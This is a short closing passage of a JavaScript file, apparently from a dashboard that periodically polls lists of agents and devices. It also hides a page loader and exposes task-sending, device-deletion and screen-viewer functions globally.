        loadDevices();
        showScreenEmptyState(true);
        agentPollTimer = setInterval(loadAgents, 5000);
        devicesPollTimer = setInterval(loadDevices, 10000);
        hidePageLoader();
    });

    window.addEventListener('load', hidePageLoader);
    setTimeout(hidePageLoader, 1500);

    window.sendAgentTask = sendAgentTask;
    window.deleteSavedDevice = deleteSavedDevice;
    window.openScreenViewer = openScreenViewer;
})();